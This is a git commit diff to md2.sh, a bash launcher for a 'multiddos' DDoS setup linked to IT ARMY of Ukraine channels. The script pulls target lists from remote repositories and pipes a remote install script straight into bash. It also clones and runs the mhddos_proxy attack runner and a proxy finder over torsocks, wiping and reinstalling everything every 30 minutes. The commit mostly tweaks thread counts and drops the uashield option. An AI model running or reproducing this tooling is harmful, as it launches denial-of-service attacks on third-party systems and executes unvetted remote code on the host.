60968fe22156b34a8adcc1db22a983691a1f8f29
uaripper <uaripper@mail.local>
2022-06-22 21:58:32 +0300

    update

--- md2.sh
+++ md2.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.9.9a\n"
+clear && echo -e "Loading... v0.9.9b\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -27,22 +27,20 @@ export -f typing_on_screen
 if [[ $docker_mode != "true" ]]; then
     gotop="on"
     db1000n="off"
-    uashield="off"
     vnstat="off"
     proxy_finder="off"
 fi
 
-if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not passed in cmd line
+if [[ $t_set_manual != "on" ]]; then export threads="-t 4000"; fi # default threads if not passed in cmd line
 if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
-
 
 ### prepare target files and show banner
 prepare_targets_and_banner () {
 [ -d /var/tmp/uaripper ] && rm -rf /var/tmp/uaripper/* || mkdir /var/tmp/uaripper/ # clean working folder or create it if it doesn't exist
 
-# DDOS по країні СЕПАРІВ (Кібер-Козаки)         https://t.me/ddos_separ
+# DDOS по країні СЕПАРІВ (Кібер-Козаки)          https://t.me/ddos_separ
 echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > /var/tmp/uaripper/source1.txt
-# IT ARMY of Ukraine            https://t.me/itarmyofukraine2022
+# IT ARMY of Ukraine                             https://t.me/itarmyofukraine2022
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > /var/tmp/uaripper/source2.txt
 echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > /var/tmp/uaripper/source3.txt
 
@@ -72,7 +70,6 @@ export -f prepare_targets_and_banner
 launch () {
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multidd > /dev/null 2>&1
-sudo pkill node shield> /dev/null 2>&1
 
 # tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
@@ -99,10 +96,6 @@ if [[ $db1000n == "on" ]]; then
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
-if [[ $uashield == "on" ]]; then
-    tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
-fi
-
 if [[ $proxy_finder == "on" ]]; then
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
@@ -112,7 +105,6 @@ tmux attach-session -t multidd
 while [ "$1" != "" ]; do
     case $1 in
         +d | --db1000n )   db1000n="on"; shift ;;
-        +u | --uashield )   uashield="on"; shift ;;
         -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
         +v | --vnstat ) vnstat="on"; shift ;;
         --lite ) export lite="on"; shift ;;
@@ -129,7 +121,7 @@ cat > ~/multidd/auto_bash.sh << 'EOF'
 # Restart and update everything (mhddos_proxy and targets) every 30 minutes
 while true; do
     #install mhddos_proxy
-    rm -rf ~/multidd; mkdir ~/multidd; cd ~/multidd
+    rm -rf ~/multidd*; mkdir ~/multidd; cd ~/multidd
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
     cd mhddos_proxy
     python3 -m pip install -r requirements.txt
@@ -138,9 +130,9 @@ while true; do
         tail -n 1000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd /var/tmp/uaripper/; split -n l/2 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in 2
+        cd /var/tmp/uaripper/; split -n l/2 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in 2; cd -
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xaa.uaripper $methods $threads $args_to_pass &
-        sleep 5 # to decrease load on cpu during simultaneous start
+        sleep 10 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xab.uaripper $methods $threads $args_to_pass &
     fi
 sleep 30m
